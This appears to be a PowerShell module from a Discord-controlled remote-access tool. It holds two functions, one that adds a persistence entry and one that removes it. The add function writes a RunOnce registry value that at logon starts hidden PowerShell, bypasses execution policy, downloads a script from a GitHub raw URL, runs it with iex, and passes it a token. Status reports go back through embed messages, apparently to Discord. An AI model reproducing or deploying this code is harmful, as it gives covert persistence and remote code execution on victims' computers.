#ENABLEPTASK
function Mcreate_Ptask{
    param([string]$token)
    $valueName = "AYRE"
    $keyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    
    # Use proper escaping for nested PowerShell execution
    $command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"& {`$token='$token'; irm 'https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/mainayre.ps1' | iex}`""
    
    Set-ItemProperty -Path $keyPath -Name $valueName -Value $command -Force
    sendEmbedWithImage -Title "REGISTRY TASK CREATED" -Description "Registry task created successfully"

}
#DISABLEPTASK
function Mremove_Ptask{
    $valueName = "AYRE"
    $keyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    if (Get-ItemProperty -Path $keyPath -Name $valueName -ErrorAction SilentlyContinue) {
        Remove-ItemProperty -Path $keyPath -Name $valueName
        sendEmbedWithImage -Title "REGISTRY TASK REMOVED" -Description "Registry task removed successfully"
    } else {
        sendEmbedWithImage -Title "ERROR" -Description ":x: No registry task found to remove"
    }
}